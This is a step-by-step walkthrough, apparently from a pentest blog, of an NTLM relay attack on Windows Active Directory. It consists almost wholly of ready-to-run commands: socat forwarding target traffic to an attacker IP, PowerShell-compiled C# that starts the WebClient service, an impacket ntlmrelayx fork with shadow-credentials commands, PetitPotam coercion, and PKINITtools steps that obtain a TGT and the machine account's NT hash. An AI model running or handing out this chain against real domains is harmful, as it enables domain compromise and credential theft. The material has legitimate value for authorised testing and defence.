---
title: "NTLM Relay Attack"
date: 2024-8-3
tags: ["ntlmreplay", "PetitPotam", "active driectory", "ad", "Windows", "adcs", "webdav", "ntlm", "PKINIT", "tgt"]
---

---
### 1. Run socat to redirect traffic (In Windows Target)

[socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)

```powershell
# Upload socat.zip
Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata')
```

```powershell
.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80
```

### 2. Enable webdav (In Windows Target)

```powershell
$Source = @"
using System;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Runtime.Versioning;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Diagnostics.CodeAnalysis;

namespace JosL.WebClient{
	public static class Starter{
		[StructLayout(LayoutKind.Explicit, Size=16)]
		public class EVENT_DESCRIPTOR{
			[FieldOffset(0)]ushort Id = 1;
			[FieldOffset(2)]byte Version = 0;
			[FieldOffset(3)]byte Channel = 0;
			[FieldOffset(4)]byte Level = 4;
			[FieldOffset(5)]byte Opcode = 0;
			[FieldOffset(6)]ushort Task = 0;
			[FieldOffset(8)]long Keyword = 0;
		}
 
		[StructLayout(LayoutKind.Explicit, Size = 16)]
		public struct EventData{
			[FieldOffset(0)]
			internal UInt64 DataPointer;
			[FieldOffset(8)]
			internal uint Size;
			[FieldOffset(12)]
			internal int Reserved;
		}
 
		public static void startService(){
			Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
 
			long handle = 0;
			uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);
 
			bool success = false;
 
			if (output == 0){
				EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
				unsafe
				{
					uint writeOutput = EventWrite(handle, ref desc, 0, null);
					success = writeOutput == 0;
					EventUnregister(handle);
				}
			}
		}
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern uint EventUnregister(long RegHandle);
	}
}
"@

$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
$compilerParameters.CompilerOptions="/unsafe"
Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
[JosL.WebClient.Starter]::startService()

```

<br>

```powershell
# Run enable_webdav.ps1
C:\programdata\enable_webdav.ps1
```

### 3. Start ntlmrelayx listener (In Local Linux)

#### Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx's Interactive LDAP Shell

```bash
git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
```

```bash
cd impacket
```

```bash
git checkout -b remotes/origin/interactive-ldap-shadow-creds
```

```bash
python3 -m venv test
```

```bash
source test/bin/activate
```

```bash
pip install .
```

```bash
pip3 install impacket pyOpenSSL==24.0.0
```

#### Run ntlmrelayx

```bash
proxychains4 examples/ntlmrelayx.py -t ldaps://<DC> --delegate-access -i
```

### 4. Run PetitPotam (In Local Linux)

[PetitPotam](https://github.com/topotam/PetitPotam)

```bash
proxychains4 python3 PetitPotam.py -u <USERNAME> -hashes :<HASH> <SOCAT_HOSTNAME>@8090/test <SOCAT_LISTENER_IP> -pipe all
```

### 5. Connect to LDAP shell (In Local Linux)

```bash
rlwrap nc 127.0.0.1 11000
```

```bash
clear_shadow_creds <SOCAT_HOSTNAME>$
```

```bash
# Take Note: pfx path and password
set_shadow_creds <SOCAT_HOSTNAME>$
```

### 6. Request TGT using pfx file (In Local Linux)

[PKINITtools](https://github.com/dirkjanm/PKINITtools)

```bash
proxychains4 python3 gettgtpkinit.py <DOMAIN>/<SOCAT_HOSTNAME>$ <SOCAT_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC>
```

### 7. Get NT Hash (In Local Linux)

```bash
proxychains4 python3 getnthash.py <DOMAIN>/<SOCAT_HOSTNAME>$ -key <AS-REP_encryption_key>
```

<br>